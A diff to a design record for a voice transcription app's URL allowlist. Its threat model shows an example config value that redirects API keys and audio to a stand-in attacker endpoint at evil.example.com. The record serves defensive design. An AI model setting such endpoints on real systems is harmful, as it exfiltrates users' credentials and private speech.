@@ -2,7 +2,7 @@
 
 ## Status
 
-Accepted — implemented in `voice_typer/server/_secrets.py`.
+Accepted: implemented in `voice_typer/server/_secrets.py`.
 
 ## Date
 
@@ -15,11 +15,11 @@ Voice Typer allows users to configure custom API endpoints for cloud transcripti
 **Threat model (SEC-002 endpoint-swap):** An attacker who gains write access to the user's config file (or exploits a vulnerability in `set_config`) can change the API endpoint to an attacker-controlled server. All subsequent transcription requests and API keys would be sent to the attacker. This is a high-impact attack:
 - API keys (OpenAI, Groq, Deepgram, etc.) would be exfiltrated to the attacker.
 - Transcribed text (which may contain sensitive personal information) would be sent to the attacker.
-- The victim would see no visible difference — the attacker's server just proxies the request to the real provider.
+- The victim would see no visible difference. The attacker's server just proxies the request to the real provider.
 
 **Without an allowlist:** A `set_config` call setting `cloud_api_url = "http://evil.example.com/steal"` would be accepted by the server. The HTTP client would happily POST audio to the attacker's endpoint.
 
-**Additional concern — HTTPS enforcement:** Many cloud providers support HTTP for legacy compatibility, but transmitting API keys and audio over cleartext HTTP on the public internet is unacceptable. Even if the host is in the allowlist, the scheme must be enforced.
+**Additional concern: HTTPS enforcement:** Many cloud providers support HTTP for legacy compatibility, but transmitting API keys and audio over cleartext HTTP on the public internet is unacceptable. Even if the host is in the allowlist, the scheme must be enforced.
 
 **Reliability angle (RELIABILITY-004):** A mistyped or malformed URL causes silent failures ("transcription not working"). The allowlist provides early rejection with a clear error message, which is faster and more user-friendly than a timeout from a nonexistent endpoint.
 
@@ -55,8 +55,8 @@ The `assert_url_allowed()` function enforces three checks:
 ### Integration
 
 Every HTTP-issuing module in the codebase uses `assert_url_allowed()` before making a request:
-- `cloud_engines.py` — cloud ASR requests.
-- `llm_polish.py` — LLM text polishing requests.
+- `cloud_engines.py` Cloud ASR requests.
+- `llm_polish.py` LLM text polishing requests.
 - Any future HTTP client.
 
 ### Error Handling
@@ -80,10 +80,10 @@ When validation fails, the function raises `ValueError` with a descriptive messa
 
 ## References
 
-- `voice_typer/server/_secrets.py` — `assert_url_allowed()`, `extend_url_allowlist()`, `get_url_allowlist()`.
-- `voice_typer/server/cloud_engines.py` — integration of URL validation.
-- `voice_typer/server/llm_polish.py` — integration of URL validation.
-- `voice_typer/server/security.py` — `_redact_text()` (redacts userinfo from URLs in logs).
-- SECURITY.md — RELIABILITY-004 documentation.
+- `voice_typer/server/_secrets.py` `assert_url_allowed()`, `extend_url_allowlist()`, `get_url_allowlist()`.
+- `voice_typer/server/cloud_engines.py` Integration of URL validation.
+- `voice_typer/server/llm_polish.py` Integration of URL validation.
+- `voice_typer/server/security.py` `_redact_text()` (redacts userinfo from URLs in logs).
+- SECURITY.md: RELIABILITY-004 documentation.
 
 *End of document.*
